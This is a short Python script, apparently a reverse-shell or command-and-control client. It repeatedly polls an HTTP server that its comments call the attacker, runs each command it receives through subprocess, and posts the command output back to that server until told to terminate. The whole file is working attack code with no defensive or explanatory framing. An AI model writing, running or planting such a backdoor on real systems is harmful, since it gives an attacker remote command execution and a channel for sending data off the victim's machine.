import http.client
import subprocess
import time


while True:

    # Setup connection to attacker
    conn = http.client.HTTPConnection('localhost', 8080)

    # Send get request and get response
    conn.request("GET", "/")
    r = conn.getresponse()
    command = r.read().decode()

    if command in {'terminate', 't'}:
        print("Terminating Connection")
        break

    else:
        print(f"Additional command running {command}")

        # open subprocess and pipe stdout and stderr to it
        CMD = subprocess.run(command, capture_output=True)

        # if stdout or stderr exists send back to attacker
        out = CMD.stdout.decode()
        if out:
            conn.request("POST", "", out)
            conn.getresponse()
        err = CMD.stderr.decode()
        if err:
            conn.request("POST", "", err)
            conn.getresponse()
    time.sleep(1)
